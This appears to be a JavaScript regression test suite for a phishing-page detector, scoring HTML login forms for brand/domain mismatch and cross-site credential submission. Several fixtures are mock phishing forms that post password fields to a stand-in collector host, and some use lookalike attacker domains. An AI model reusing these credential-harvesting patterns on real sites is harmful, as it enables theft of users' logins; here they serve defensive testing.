const assert = require('node:assert/strict');
const extract = require('./extract-fixture.cjs');
const { scoreEvidence } = require('../../src/shared/model-policy.js');
const source = 'https://members.example/login';
const password = '<input type="password" name="password">';
const localLogin = '<form method="post" action="/session">' + password + '</form>';
const remoteLogin = '<form method="post" action="https://collector.example.net/collect">' + password + '</form>';

for (const article of ['', 'a ', 'an ', 'the ', 'your ', 'my ']) {
  const result = extract('<title>Sign in with ' + article + 'Google Account</title>' +
    '<form method="post" action="https://accounts.google.com/login"><input type="email" autocomplete="username"></form>', source);
  assert.equal(result.brand_domain_mismatch, 0, 'ordinary provider phrase: ' + article);
  assert.equal(scoreEvidence(result).outcome, 'CAUTION', 'cross-site SSO remains visible without fabricated ownership');
}
assert.equal(extract('<title>Sign in with a Google Account - PayPal Login</title>' + remoteLogin, source).brand_domain_mismatch, 1,
  'a provider phrase cannot hide a separate ownership claim');

for (const control of [
  '<input type="email" name="email" aria-label="Enter your email to reset your password">',
  '<input type="email" name="passwordResetEmail" placeholder="Password reset email">',
  '<input name="email" placeholder="Email for password reset">',
  '<label for="recovery">Enter your email to reset your password</label><input id="recovery">'
]) {
  const result = extract('<title>Password recovery</title><form method="get" action="https://id.example.net/recover">' + control + '</form>', source);
  assert.equal(result.has_password_input, 0);
  assert.equal(result.sensitive_credential_field_count, 0);
  assert.equal(scoreEvidence(result).outcome, 'CAUTION');
}
assert.equal(extract('<input aria-label="Password">', source).has_password_input, 1, 'text-type password prompts remain detected');

for (const url of ['https://sites.google.com/view/demo', 'https://login.microsoftonline.com/']) {
  const result = extract('<title>PayPal Login</title>' + remoteLogin, url);
  assert.equal(result.is_official_brand_domain, 1);
  assert.equal(result.brand_domain_mismatch, 1, 'platform identity cannot cancel PayPal mismatch');
  assert.equal(scoreEvidence(result).outcome, 'HIGH_RISK');
}
for (const domain of ['google.ch', 'google.cat', 'google.com.tw', 'google.co.za']) {
  assert.equal(extract('<title>Google Account</title>' + remoteLogin, 'https://www.' + domain + '/').brand_domain_mismatch, 0,
    domain + ' reviewed official ownership');
  const bad = extract('<title>Google Account</title>' + remoteLogin, 'https://' + domain + '.attacker.example/');
  assert.equal(bad.is_official_brand_domain, 0);
  assert.equal(bad.brand_domain_mismatch, 1, 'ownership suffix boundary');
}
for (const brand of ['icici', 'hdfc', 'sbi', 'axis']) {
  assert.equal(extract('<title>' + brand + ' Login</title>' + localLogin, 'https://www.' + brand + '.bank.in/').brand_domain_mismatch, 0,
    brand + ' reviewed bank migration domain');
  assert.equal(extract('<title>' + brand + ' Login</title>' + localLogin, 'https://' + brand + '.bank.in.attacker.example/').brand_domain_mismatch, 1);
}
assert.equal(scoreEvidence(extract('<title>Google Account</title><form action="http://collector.example.net/" method="post">' + password + '</form>',
  'https://google.ch/')).outcome, 'HIGH_RISK', 'official ownership never exempts an unsafe credential destination');

for (const wrap of [
  (html) => '<details><summary>Archived form</summary>' + html + '</details>',
  (html) => '<dialog>' + html + '</dialog>',
  (html) => '<div style="content-visibility:hidden">' + html + '</div>'
]) {
  const result = extract('<title>Member Portal</title>' + wrap(remoteLogin), source);
  assert.equal(result.credential_field_count, 0);
  assert.equal(scoreEvidence(result).outcome, 'SAFE');
}
assert.equal(extract('<details open><summary>Login</summary>' + localLogin + '</details>', source).has_password_input, 1);
assert.equal(extract('<details><summary>' + password + '</summary></details>', source).has_password_input, 1,
  'the first summary remains visible in a closed details element');
const hiddenOverride = extract('<form method="post" action="/session">' + password +
  '<button>Sign in</button><button hidden formaction="http://collector.example.net">Archived</button></form>', source);
assert.equal(hiddenOverride.cross_domain_form_action, 0, 'inactive override is not active credential submission evidence');

const bodyClaim = extract('<title>Sign in</title><h1>PayPal</h1>' + localLogin, source);
assert.equal(bodyClaim.body_brand_domain_mismatch, 1);
assert.equal(bodyClaim.page_title_mismatch, 0);
assert.equal(scoreEvidence(bodyClaim).outcome, 'CAUTION', 'a primary body identity claim contributes without inventing independent corroboration');
assert.equal(scoreEvidence(extract('<title>Sign in</title><h1>PayPal</h1>' + remoteLogin, source)).outcome, 'HIGH_RISK');
for (const content of [
  '<h1>PayPal account recovery guide</h1>', '<h1>Sign in with PayPal</h1>',
  '<p>PayPal</p>', '<h1 hidden>PayPal</h1>', '<details><summary>Archived</summary><h1>PayPal</h1></details>',
  '<h1><span hidden>PayPal</span></h1>',
  '<div contenteditable="true"><h1>PayPal</h1></div>'
]) assert.equal(extract('<title>Sign in</title>' + content + localLogin, source).body_brand_domain_mismatch, 0, content);
for (const content of [
  '<article><h1>PayPal</h1><p>Article about payments.</p></article>',
  '<nav><h1>PayPal</h1></nav>', '<footer><h1>PayPal</h1></footer>', '<div role="comment"><h1>PayPal</h1></div>'
]) assert.equal(extract('<title>Sign in</title>' + content + localLogin, source).body_brand_domain_mismatch, 0,
  'contextual heading must not become a login identity: ' + content);
const unrelatedFooter = extract('<title>Sign in</title><h1>PayPal</h1><p>Article content</p><footer>' + remoteLogin + '</footer>', source);
assert.equal(unrelatedFooter.body_brand_domain_mismatch, 0);
assert.equal(scoreEvidence(unrelatedFooter).outcome, 'CAUTION', 'an unrelated footer login cannot corroborate a body heading');
const scopedBodyIdentity = extract('<title>Sign in</title><h1>PayPal</h1>' + localLogin +
  '<section><h2>Separate organization login</h2>' + remoteLogin + '</section>', source);
assert.equal(scopedBodyIdentity.body_brand_domain_mismatch, 1);
assert.equal(scopedBodyIdentity.credential_contexts[0].brand_domain_mismatch, 1);
assert.equal(scopedBodyIdentity.credential_contexts[1].brand_domain_mismatch, 0);
assert.equal(scoreEvidence(scopedBodyIdentity).outcome, 'CAUTION', 'body identity and destination must describe the same credential UI');

const custom = extract('<title>PayPal Login</title><div contenteditable="true" role="textbox" aria-label="Password">never read user text</div>', source,
  (window) => {
    const editor = window.document.querySelector('[contenteditable]');
    Object.defineProperty(editor, 'textContent', { get() { throw new Error('editor contents must not be read'); } });
    Object.defineProperty(editor, 'innerText', { get() { throw new Error('editor contents must not be read'); } });
  });
assert.equal(custom.has_password_input, 1);
assert.equal(custom.credential_contexts[0].cross_domain_form_action, 0, 'an editor is not a native submitting field');
assert.equal(scoreEvidence(custom).outcome, 'CAUTION');
assert.equal(extract('<div contenteditable="false" role="textbox" aria-label="Password"></div>', source).credential_field_count, 0);
assert.equal(extract('<div contenteditable="true" role="textbox" aria-label="Password" aria-disabled="true" aria-readonly="true"></div>', source).has_password_input, 1,
  'ARIA metadata alone cannot conceal a browser-editable surface');
const cards = extract('<form method="post"><label>Credit card<input name="x"></label>' +
  '<label>Expiration<input name="y"></label><label>Security code<input name="z"></label></form>', source);
assert.equal(cards.sensitive_credential_field_count, 3);
assert.equal(cards.has_password_input, 0);

const nativeGet = extract('<form action="https://collector.example.net/collect">' + password + '</form>', source);
assert.equal(nativeGet.credential_contexts[0].credential_form_native_get, 1, 'one blocking field permits native implicit GET');
assert.equal(scoreEvidence(nativeGet).outcome, 'HIGH_RISK');
const localGet = extract('<form action="/session">' + password + '<button>Continue</button></form>', source);
assert.equal(scoreEvidence(localGet).outcome, 'CAUTION', 'local native GET exposure is disclosed');
for (const script of [
  '<script src="/app.js"></script>',
  '<script>document.forms[0].addEventListener("submit", e => e.preventDefault());</script>'
]) {
  const ajax = extract('<form action="https://id.example.net/session">' + password + '<button>Continue</button></form>' + script, source);
  assert.equal(ajax.credential_contexts[0].credential_form_native_get, 0, 'unobserved JavaScript interception cannot establish native submission');
  assert.equal(scoreEvidence(ajax).outcome, 'CAUTION');
}
const incidentalFetch = extract('<form method="post" action="/session">' + password + '</form>' +
  '<script>fetch("https://cdn.example.net/help");</script>', source);
assert.equal(incidentalFetch.credential_submission_script, 0, 'a fetch token is not credential data flow');
assert.equal(scoreEvidence(incidentalFetch).outcome, 'SAFE');
assert.equal(scoreEvidence(extract('<title>Secure sign in</title>' + localLogin, source)).outcome, 'SAFE',
  'an unknown same-site HTTPS login alone must not be fabricated into phishing');
const inheritedFrame = extract('<title>PayPal Login</title>' + remoteLogin, 'about:blank', (window) => {
  Object.defineProperty(window, 'origin', { value: 'https://members.example', configurable: true });
});
assert.equal(inheritedFrame.hostname, 'members.example');
assert.equal(inheritedFrame.cross_domain_form_action, 1);
assert.equal(scoreEvidence(inheritedFrame).outcome, 'HIGH_RISK', 'inherited HTTP origin is inspected without trusting an HTML base');
const inheritedEmpty = extract('<title>Sign in</title>' + localLogin.replace(' action="/session"', ''), 'about:srcdoc', (window) => {
  Object.defineProperty(window, 'origin', { value: 'https://members.example', configurable: true });
});
assert.equal(inheritedEmpty.credential_contexts[0].credential_destination_unknown, 1);
assert.equal(inheritedEmpty.cross_domain_form_action, 0);
assert.equal(inheritedEmpty.invalid_credential_action, 0, 'an unknown inherited empty action is not invented as an unsafe HTTP destination');
console.log('Audit detection repairs and conservative coverage regressions passed.');
